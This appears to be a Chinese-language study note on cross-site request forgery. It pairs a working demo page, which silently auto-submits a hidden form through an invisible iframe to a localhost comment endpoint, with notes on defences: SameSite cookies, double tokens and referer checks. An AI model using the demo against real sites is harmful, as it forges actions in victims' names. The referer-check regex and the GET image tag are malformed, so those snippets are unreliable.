---
title: csrf
type: "categories"
categories: 其他
---

# Cross site request forgy 
跨站请求伪造
```
//POST请求
<!doctype html>
<html>
	<head>
		<meta charset="utf-8"/>
		<title>csrf demo</title>
	</head>
	<body>
		hello，这里什么也没有。
		<script>
			document.write(`
				<form name="commentForm" target="csrf" method="post" action="http://localhost:1521/post/addComment">
					<input name="postId" type="hidden" value="11">
					<textarea name="content">来自CSRF！</textarea>
				</form>`
			);

			var iframe = document.createElement('iframe');
			iframe.name = 'csrf';
			iframe.style.display = 'none';
			document.body.appendChild(iframe);

			setTimeout(function(){
				document.querySelector('[name=commentForm]').submit();
			},1000);
		</script>
	</body>
</html>
```
```
//GET请求
	<img src="localhost:8080/ajax/addcomment?postId=233&content=<a href="file://xxx.crsf.html"/>
```
解决方案1：
禁用第三方网站带cookie：same-site属性

解决方案二：
不访问A网站的前端
在前端页面加入验证信息
验证码
token cookie中放个token，html的meta里也放个token，并且token也不能为空，两者一样才验证通过，跨站请求伪造是不通过用户前端页面的，所以拿不到页面里的token，所以验证通过不了
- 假如只有meta里存token会出问题，攻击者提交表单的时候随便伪造一个token就好了，
- 假如token只是保存在cookie里面，攻击者只要拿到cookie就可以了

解决方案3：
通过headers.referer来判断
```
if(!(\^https?:\/\/localhost\).test(headers.referer)) {
	throw new Error('非法请求')
}
```
